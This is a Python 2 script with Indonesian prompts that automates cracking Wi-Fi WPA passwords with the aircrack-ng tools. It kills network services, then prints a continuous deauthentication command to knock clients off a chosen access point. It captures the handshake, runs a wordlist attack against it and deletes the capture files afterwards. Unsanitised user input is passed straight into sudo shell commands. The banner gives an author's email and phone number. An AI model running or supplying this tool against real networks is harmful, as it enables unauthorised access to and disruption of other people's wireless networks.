# -*- coding: utf-8 -*-
import os, sys, time, re, requests, traceback

print 'Starting.........'
time.sleep(1)
os.system('sudo airmon-ng check kill')
os.system('clear')
print '\033[0;32m             █     █░ ██▓    ▄▄▄       ███▄    █ '
print '\033[0;32m            ▓█░ █ ░█░▓██▒   ▒████▄     ██ ▀█   █ '
print '\033[0;32m            ▒█░ █ ░█ ▒██░   ▒██  ▀█▄  ▓██  ▀█ ██▒'
print '\033[0;32m            ░█░ █ ░█ ▒██░   ░██▄▄▄▄██ ▓██▒  ▐▌██▒'
print '\033[0;32m            ░░██▒██▓ ░██████▒▓█   ▓██▒▒██░   ▓██░'
print '\033[0;32m            ░ ▓░▒ ▒  ░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ▒ ▒ '
print '\033[0;32m              ▒ ░ ░  ░ ░ ▒  ░ ▒   ▒▒ ░░ ░░   ░ ▒░'
print '\033[0;32m              ░   ░    ░ ░    ░   ▒      ░   ░ ░ '
print '\033[0;32m                ░        ░  ░     ░  ░         ░ '
print '\033[0;32m +-----------------------------------------------------------+'
print '\033[0;32m |Script ini dibuat oleh alanward55 pada tanggal 05 Juni 2021|'
print '\033[0;32m +-----+-------------------------+---------------------+-----+'
print '\033[0;32m       |Email: ondeuli@gmail.com |Phone: +6285326728933|'
print '\033[0;32m       +-------------------------+---------------------+'
print '\033[1;31m ====================[Copyright © 2021]======================='
print '\033[0;32m________________________________________________________________'
os.system('iwconfig')

itf = raw_input('\033[0;32mMasukkan jenis interface: ')

os.system('sudo airodump-ng '+ itf)

print('\033[1;32mCopas BSSID nya!')

time.sleep(3)

bssid = raw_input('Masukkan BSSID: ')
c = raw_input('Masukkan nomor CH: ')
print('\n')
print 'sudo aireplay-ng -0 0 -a',bssid ,itf ,'&& exit'
print('''
Pastekan command diatas pada tab yang baru terbuka
kemudian enter, tunggu 30 detik
kemudian tekan ctrl + c''')
os.system('xdotool key ctrl+shift+n')
print '\033[0;32m_____________________________'
time.sleep(10)

hsfile = raw_input('''
Masukkan lokasi untuk menyimpan handshake 
Contoh: /home/user/wifi/file
Lokasi: ''')
os.system('sudo airodump-ng --bssid '+ bssid +' -c '+ c +' -w '+hsfile+' '+itf)

print('\033[1;31mHandshake berhasil tersimpan!')
print '\033[0;32m__________'
animasi = ['#', '##', '###', '####', '#####', '######', '#######', '########', '#########', '##########', ]
for i in range(len(animasi)):
	time.sleep(0.3)
	sys.stdout.write('\r' + animasi[i % len(animasi)])
	sys.stdout.flush()
print '\033[0;32m\n__________'
wd = raw_input('''
Masukkan lokasi wordlist: 
Contoh: /home/user/Downloads/wordlist.txt
Lokasi: ''')
time.sleep(2)
print('\nREADY!')
time.sleep(3)
os.system('sudo aircrack-ng '+hsfile+'-01.cap -w '+wd)
print ('\033[1;31m\nDeleting chace.................')
time.sleep(1)
os.system('sudo rm -rf '+hsfile+'-01.cap')
time.sleep(1)
os.system('sudo rm -rf '+hsfile+'-01.csv')
time.sleep(1)
os.system('sudo rm -rf '+hsfile+'-01.kismet.csv')
time.sleep(1)
os.system('sudo rm -rf '+hsfile+'-01.kismet.netxml')
time.sleep(1)
os.system('sudo rm -rf '+hsfile+'-01.log.csv')
time.sleep(1)
print '\033[0;32m_______________________________________'
os.system('sudo airmon-ng start '+itf)
os.system('sudo airmon-ng stop '+itf+'mon')
print ('\nTerimakasih telah menggunakan script ini')
print ('\nExiting.............')
time.sleep(3)
